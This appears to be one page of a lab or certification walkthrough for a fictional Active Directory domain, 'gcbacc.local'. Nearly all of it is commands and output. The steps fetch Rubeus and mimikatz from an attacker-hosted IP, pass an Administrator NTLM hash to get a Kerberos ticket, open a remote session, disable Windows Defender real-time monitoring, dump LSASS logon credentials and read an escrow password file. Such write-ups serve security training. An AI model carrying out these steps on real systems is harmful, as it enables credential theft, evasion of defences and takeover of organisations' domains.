---
layout: default
---

## acc-data.gcbacc.local 

From the acc-dc07.gcbacc.local with an stable connection i'm going to access with DA credentials in the acc-data.gcbacc.local server  


### 1. Impersonate Domain Admin User:

```
PS C:\> wget http://192.168.100.15/Rubeus.exe -OutFile C:\Rubeus.exe
wget http://192.168.100.15/Rubeus.exe -OutFile C:\Rubeus.exe
PS C:\> C:\Rubeus.exe asktgt /user:Administrator /domain:gcbacc.local /ntlm:70d6b3cabbe11f8f0b06a7380e7a5005 /ptt
C:\Rubeus.exe asktgt /user:Administrator /domain:gcbacc.local /ntlm:70d6b3cabbe11f8f0b06a7380e7a5005 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 70d6b3cabbe11f8f0b06a7380e7a5005
[*] Building AS-REQ (w/ preauth) for: 'gcbacc.local\Administrator'
[*] Using domain controller: fe80::aa48:e8b7:2ad4:69b%9:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFxDCCBcCgAwIBBaEDAgEWooIE1DCCBNBhggTMMIIEyKADAgEFoQ4bDEdDQkFDQy5MT0NBTKIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMZ2NiYWNjLmxvY2Fso4IEjDCCBIigAwIBEqEDAgECooIEegSCBHYlCf/E
      ijflkg2wRmQZtbboEWPIrJCH1n6dXg9o65QO2WuHEPDMHUZZkp4NfWVmuzBq+nwznCT4xH59Hb7bZlIu
      /aMthv+KW2eIgGRwSBgYi8HPn0tY0b4Q6LLrtUVmqZPiE35GnrYThkq9zd69vWeKez4tgE5aKM/b9LVN
      zOQ0t5Y/q0a3KfaQtKKvTTTqn0SyxXGM4x42+rhugLf508jKdE0ciqvPYn8DHubDiE5brk5UNjj3wSlY
      Ev1P+wzmqeYyzkprI/2TFkFcUtLQmuvbyOAEhw/gWuvtPUtCnN2xMwbLbveC/yxRwfb2JS4L2Af6nO5n
      oYP/4lq2/yE6N8InS/8VhmatSHiNDasVWDnut8OIXivP3WP0eB5kzp5IVt7QxJHRb1Y9dEig70Tyg1e/
      rA0A9QQwCCxJvTFf2CkoWSbPOXdlRKNKnA7oaBPnynS1eo1AbTYxdpxsFcQQkKPOZOLOEw5cK5q1gJux
      cY7WgRtHW/ijnTr7H+F0uXrkj2uthBvTe8tS9Twe8IATFzFTh9eGleXXZ4Kzq1KxgMx5eyqh/4L0LFPl
      bjB95AskGr8+Jbk2BC8uUqg84HL5Ch0LjrEtL4Tvmt4H39oI23K0kT8xxY9dye6QO6s/tOwuK3SN3pGW
      /iu+eYDQkdlDIgBvKfX9NLy4A+2vTMyrbCp4RWM6tIW/XNntwxoxmimNSMJlQ7RCG41qNCX7uP9/hCpw
      xr9gIxwiOOD43kRY2KUu8JcTerm3zyOr7SUv/k2wMrZYWfF93ML36GUBZmyIbUeXSNhgQdpAlNvOynLt
      big6YWGyh6nL5HJsCLOTmUPEy2XU5kDofW3R6LmP8mSuLq8Y5LWBSOTJOHcCqfge7sOFoduj1ppS1mux
      +NKwcP8Yv80pK2YuKSWN2FXN+LG6JrkihpOrGp+xaFibHVju2EdKsIwQC60hUn+2hzxXc4c70yLeGMvv
      0VKpT8jalZaVhHoi/cCgqSancNL1wg9H+wrk+HReeMCUwXVsNQ8IIzY5yxpgLLdNb8L+Ccfuic55rRXE
      FM4WZG17swcIbaDGxnoKTg3MAcwjNY9BuDx4FpgQd2dNGSAS/4lBW9H4KzKMiEthwpFCVy/LyRDq+uz5
      iqjZsR+mn7aIVWZzaXuiNGk0PFV2pC7AJTDtlR9jE2hnokrjpOetKV0TGwcMvjCPLBZcPmGF3mWw7Ncw
      k9izQKyBCVaB8yiPnDTtWulyroIJc/YTTmvACjhX9Ulfk8tnu7xvBlWsmHrkd0yzZNs+oq/yfeIYQB5l
      lxJOT8IYLZOLNY6zZ3DG6wL1pOmGMdu1XU9s7eeiKiiZUnYQE16papLlKxm80p669mRoWoG4W21E/z+C
      mOCHbVJgRWPLn3paHNjycUITs645KTC/WrxSfNYuWI4WfVvEno0y0Bbbk0pIZQ5TFVfvgi10Q0vQNqRM
      DsfAEWl6jTkR3ThZkYcNnU43b2CLE928I3hEJ1eYkOuhNBE/cJCxOeSn2FQJrtCu86mG7vJm0Vg2daOB
      2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oBswGaADAgEXoRIEEInKC/4e1KFHB21Kb6ytYyGh
      DhsMR0NCQUNDLkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOEAAKURGA8yMDI0
      MDcyNjA3NDc0N1qmERgPMjAyNDA3MjYxNzQ3NDdapxEYDzIwMjQwODAyMDc0NzQ3WqgOGwxHQ0JBQ0Mu
      TE9DQUypITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGdjYmFjYy5sb2NhbA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/gcbacc.local
  ServiceRealm             :  GCBACC.LOCAL
  UserName                 :  Administrator
  UserRealm                :  GCBACC.LOCAL
  StartTime                :  7/26/2024 12:47:47 AM
  EndTime                  :  7/26/2024 10:47:47 AM
  RenewTill                :  8/2/2024 12:47:47 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  icoL/h7UoUcHbUpvrK1jIQ==
  ASREP (key)              :  70D6B3CABBE11F8F0B06A7380E7A5005
```

### 2. Access to acc-data.gcbacc.local

```
PS C:\> Enter-PSSession -ComputerName acc-data.gcbacc.local
Enter-PSSession -ComputerName acc-data.gcbacc.local
[acc-data.gcbacc.local]: PS C:\Users\Administrator.ACC\Documents> whoami;hostname;ipconfig
whoami;hostname;ipconfig
acc\administratoracc-data
Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::6afb:13ee:378a:158c%4
   IPv4 Address. . . . . . . . . . . : 192.168.79.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.79.254

```
### 3. Disable AV and Dump Lsass process

```
[acc-data.gcbacc.local]: PS C:\Users\Administrator.ACC\Documents> powershell -c Set-MpPreference -DisableRealTimeMonitoring 1
powershell -c Set-MpPreference -DisableRealTimeMonitoring 1
[acc-data.gcbacc.local]: PS C:\Users\Administrator.ACC\Documents> powershell -c wget http://192.168.100.15/mimikatz.exe -OutFile C:\mimikatz.exe
powershell -c wget http://192.168.100.15/mimikatz.exe -OutFile C:\mimikatz.exe
[acc-data.gcbacc.local]: PS C:\Users\Administrator.ACC\Documents> C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"
C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 3077803 (00000000:002ef6ab)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:27:58 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : ACC-DATA$
         * Domain   : ACC
         * NTLM     : 41e43c7f30326a9658e7dc27205b2a93
         * SHA1     : ded2e85415160f8c60dd6bedefc8ff8f67311d2c
         * DPAPI    : ded2e85415160f8c60dd6bedefc8ff8f
        tspkg :
        wdigest :
         * Username : ACC-DATA$
         * Domain   : ACC
         * Password : (null)
        kerberos :
         * Username : ACC-DATA$
         * Domain   : gcbacc.local
         * Password : cc 93 84 37 96 d6 cd c7 c6 d3 d1 5c 85 bb 30 3b f3 0b 9e 62 2c e0 5c 67 6d 76 ca 2a c7 28 b6 40 e0 7f c6 89 86 f7 60 7e cf b3 f2 68 4b c3 a5 cb 51 d1 bc bb 7d b2 18 9a 30 1c 53 d1 10 a7 74 07 4c 48 48 98 42 61 d5 bf 3a b6 52 19 4d fb 1b c9 a9 56 1a da fd e0 0f 00 43 3b 9e dd 11 f1 35 44 d4 f8 cd cb b3 26 0d 3c ed a7 cb 97 f6 f7 1b 84 f9 4f 64 b0 10 8c 15 05 1a b7 f8 28 2c c5 9b 2b 12 6c 1f e0 ba 26 36 ee b7 e7 c0 f8 02 dc f8 1e fb d9 d9 18 c9 f9 d2 b6 40 f7 03 61 ea 0d d0 4a bb 98 c9 53 f7 60 70 04 78 30 80 0d a2 91 68 0f 6f 52 ab 37 0c 86 50 27 0d 9a 85 80 47 3d ef 49 bc 0a 50 37 87 66 48 e6 d5 7b 44 21 f5 3d a5 87 97 46 a3 67 41 47 8d b6 16 d9 64 fd 0c ae 3d 4f 7e a9 7c 33 e9 c4 d0 7d 9a c3 01 12 a4 f2 9e 1d
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ACC-DATA$
Domain            : ACC
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:07 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : ACC-DATA$
         * Domain   : ACC
         * NTLM     : 41e43c7f30326a9658e7dc27205b2a93
         * SHA1     : ded2e85415160f8c60dd6bedefc8ff8f67311d2c
         * DPAPI    : ded2e85415160f8c60dd6bedefc8ff8f
        tspkg :
        wdigest :
         * Username : ACC-DATA$
         * Domain   : ACC
         * Password : (null)
        kerberos :
         * Username : acc-data$
         * Domain   : GCBACC.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 33036 (00000000:0000810c)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:07 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : ACC-DATA$
         * Domain   : ACC
         * NTLM     : 41e43c7f30326a9658e7dc27205b2a93
         * SHA1     : ded2e85415160f8c60dd6bedefc8ff8f67311d2c
         * DPAPI    : ded2e85415160f8c60dd6bedefc8ff8f
        tspkg :
        wdigest :
         * Username : ACC-DATA$
         * Domain   : ACC
         * Password : (null)
        kerberos :
         * Username : ACC-DATA$
         * Domain   : gcbacc.local
         * Password : cc 93 84 37 96 d6 cd c7 c6 d3 d1 5c 85 bb 30 3b f3 0b 9e 62 2c e0 5c 67 6d 76 ca 2a c7 28 b6 40 e0 7f c6 89 86 f7 60 7e cf b3 f2 68 4b c3 a5 cb 51 d1 bc bb 7d b2 18 9a 30 1c 53 d1 10 a7 74 07 4c 48 48 98 42 61 d5 bf 3a b6 52 19 4d fb 1b c9 a9 56 1a da fd e0 0f 00 43 3b 9e dd 11 f1 35 44 d4 f8 cd cb b3 26 0d 3c ed a7 cb 97 f6 f7 1b 84 f9 4f 64 b0 10 8c 15 05 1a b7 f8 28 2c c5 9b 2b 12 6c 1f e0 ba 26 36 ee b7 e7 c0 f8 02 dc f8 1e fb d9 d9 18 c9 f9 d2 b6 40 f7 03 61 ea 0d d0 4a bb 98 c9 53 f7 60 70 04 78 30 80 0d a2 91 68 0f 6f 52 ab 37 0c 86 50 27 0d 9a 85 80 47 3d ef 49 bc 0a 50 37 87 66 48 e6 d5 7b 44 21 f5 3d a5 87 97 46 a3 67 41 47 8d b6 16 d9 64 fd 0c ae 3d 4f 7e a9 7c 33 e9 c4 d0 7d 9a c3 01 12 a4 f2 9e 1d
        ssp :
        credman :

Authentication Id : 0 ; 31457 (00000000:00007ae1)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:07 PM
SID               :
        msv :
         [00000003] Primary
         * Username : ACC-DATA$
         * Domain   : ACC
         * NTLM     : 41e43c7f30326a9658e7dc27205b2a93
         * SHA1     : ded2e85415160f8c60dd6bedefc8ff8f67311d2c
         * DPAPI    : ded2e85415160f8c60dd6bedefc8ff8f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 3107184 (00000000:002f6970)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : ACC-DATA
Logon Server      : ACC-DATA
Logon Time        : 4/29/2024 12:28:09 AM
SID               : S-1-5-21-41145949-3180596299-3853634656-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : ACC-DATA
         * NTLM     : 21adafbfda943acc0c27bbcd3460a92a
         * SHA1     : be18034331af07976b3cccf55a8411b57ec9eb6b
         * DPAPI    : be18034331af07976b3cccf55a8411b5
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : ACC-DATA
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : ACC-DATA
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:08 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 33006 (00000000:000080ee)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:07 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : ACC-DATA$
         * Domain   : ACC
         * NTLM     : 41e43c7f30326a9658e7dc27205b2a93
         * SHA1     : ded2e85415160f8c60dd6bedefc8ff8f67311d2c
         * DPAPI    : ded2e85415160f8c60dd6bedefc8ff8f
        tspkg :
        wdigest :
         * Username : ACC-DATA$
         * Domain   : ACC
         * Password : (null)
        kerberos :
         * Username : ACC-DATA$
         * Domain   : gcbacc.local
         * Password : cc 93 84 37 96 d6 cd c7 c6 d3 d1 5c 85 bb 30 3b f3 0b 9e 62 2c e0 5c 67 6d 76 ca 2a c7 28 b6 40 e0 7f c6 89 86 f7 60 7e cf b3 f2 68 4b c3 a5 cb 51 d1 bc bb 7d b2 18 9a 30 1c 53 d1 10 a7 74 07 4c 48 48 98 42 61 d5 bf 3a b6 52 19 4d fb 1b c9 a9 56 1a da fd e0 0f 00 43 3b 9e dd 11 f1 35 44 d4 f8 cd cb b3 26 0d 3c ed a7 cb 97 f6 f7 1b 84 f9 4f 64 b0 10 8c 15 05 1a b7 f8 28 2c c5 9b 2b 12 6c 1f e0 ba 26 36 ee b7 e7 c0 f8 02 dc f8 1e fb d9 d9 18 c9 f9 d2 b6 40 f7 03 61 ea 0d d0 4a bb 98 c9 53 f7 60 70 04 78 30 80 0d a2 91 68 0f 6f 52 ab 37 0c 86 50 27 0d 9a 85 80 47 3d ef 49 bc 0a 50 37 87 66 48 e6 d5 7b 44 21 f5 3d a5 87 97 46 a3 67 41 47 8d b6 16 d9 64 fd 0c ae 3d 4f 7e a9 7c 33 e9 c4 d0 7d 9a c3 01 12 a4 f2 9e 1d
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ACC-DATA$
Domain            : ACC
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:07 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : ACC-DATA$
         * Domain   : ACC
         * Password : (null)
        kerberos :
         * Username : acc-data$
         * Domain   : GCBACC.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # vault::list
ERROR kuhl_m_vault_list ; VaultEnumerateVaults : 0x80090345

mimikatz(commandline) # vault::cred /patch

mimikatz(commandline) # exit
Bye!
```


### 4. looking for credentials

```
[acc-data.gcbacc.local]: PS C:\Users\Administrator.ACC\Documents> powershell -c ls C:\
powershell -c ls C:\


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2020   2:21 AM                escrow2
d-----        10/2/2020   3:25 AM                PerfLogs
d-r---        9/13/2019   7:04 AM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-r---        4/14/2022   1:39 AM                Users
d-----        2/15/2024   3:44 AM                Windows
-a----        7/26/2024  12:52 AM        1489408 mimikatz.exe


[acc-data.gcbacc.local]: PS C:\Users\Administrator.ACC\Documents> powershell -c ls C:\escrow2\
powershell -c ls C:\escrow2\


    Directory: C:\escrow2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/8/2020   2:21 AM             10 escrow2.txt


[acc-data.gcbacc.local]: PS C:\Users\Administrator.ACC\Documents> powershell -c type C:\escrow2\escrow2.txt
powershell -c type C:\escrow2\escrow2.txt
theC0mp@ny
```


[back](./section6.html)
